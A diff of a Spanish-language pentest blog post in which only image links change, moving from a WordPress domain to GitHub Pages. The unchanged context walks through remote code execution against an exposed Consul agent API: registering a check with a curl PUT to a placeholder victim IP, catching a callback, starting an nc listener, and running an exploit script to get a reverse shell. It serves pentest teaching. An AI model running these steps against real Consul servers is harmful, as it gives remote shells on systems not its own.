@@ -25,7 +25,7 @@ Verificando la ejecución de comandos
 Por defecto, los agentes de consul escuchan en el puerto 8500 y permiten peticiones HTTP. Durante un pentest, si descubrimos un puerto 8500 abierto será importante verificar si se trata de la API de consul. Para esto,  podemos realizar un simple: curl ip:8500 y la respuesta será Consul Agent.
 {: style="text-align: justify;"}
 
-[![](https://donttouchmy.net/wp-content/uploads/2018/11/curl_nmap-1-300x85.png)](https://donttouchmy.net/wp-content/uploads/2018/11/curl_nmap-1.png)
+[![](https://donttouchmynet.github.io/assets/images/old/curl_nmap-1-300x85.png)](https://donttouchmynet.github.io/assets/images/old/curl_nmap-1.png)
 
 Si realmente es un Consul Agent podemos utilizar la función de checks para ejecutar código.  Podemos hacer una prueba creando un fichero con el siguiente contenido llamado payload.json:
 {: style="text-align: justify;"}
@@ -46,7 +46,7 @@ curl --request PUT --data @payload.json http://IP_VICTIMA:8500/v1/agent/check/re
 Levantamos un servidor web con python y si funciona recibiremos una petición web del servidor en nuestra IP:
 {: style="text-align: justify;"}
 
-[![](https://donttouchmy.net/wp-content/uploads/2018/11/webserver-300x56.png)](https://donttouchmy.net/wp-content/uploads/2018/11/webserver.png)
+[![](https://donttouchmynet.github.io/assets/images/old/webserver-300x56.png)](https://donttouchmynet.github.io/assets/images/old/webserver.png)
 
 Si queremos desregistrar el check podemos utilizar:
 {: style="text-align: justify;"}
@@ -67,19 +67,19 @@ Para facilitar la explotación podéis utilizar el siguiente script: [exploit-c
 Para obtener una reverse shell primero utilizaremos el comando nc -lvp 4567 para esperar una conexión en el puerto 4567.
 {: style="text-align: justify;"}
 
-[![](https://donttouchmy.net/wp-content/uploads/2018/11/nc-1-300x65.png)](https://donttouchmy.net/wp-content/uploads/2018/11/nc-1.png)
+[![](https://donttouchmynet.github.io/assets/images/old/nc-1-300x65.png)](https://donttouchmynet.github.io/assets/images/old/nc-1.png)
 
 Tras esto ejecutamos el script indicando la URL, nuestra IP y el puerto de escucha de nc:
 {: style="text-align: justify;"}
 ```
 python consul_exploit.py --url http://IP_VICTIMA:8500 --ip IP_PROPIA --port 4567
 ```
-[![exploit consul](https://donttouchmy.net/wp-content/uploads/2018/11/python_exploit-300x16.png)](https://donttouchmy.net/wp-content/uploads/2018/11/python_exploit.png)
+[![exploit consul](https://donttouchmynet.github.io/assets/images/old/python_exploit-300x16.png)](https://donttouchmynet.github.io/assets/images/old/python_exploit.png)
 
 Al cabo de unos segundos recibiremos la reverse shell:
 {: style="text-align: justify;"}
 
-[![exploit consul](https://donttouchmy.net/wp-content/uploads/2018/11/nc_reverse-300x121.png)](https://donttouchmy.net/wp-content/uploads/2018/11/nc_reverse.png)
+[![exploit consul](https://donttouchmynet.github.io/assets/images/old/nc_reverse-300x121.png)](https://donttouchmynet.github.io/assets/images/old/nc_reverse.png)
 
 Remediación
 -----------
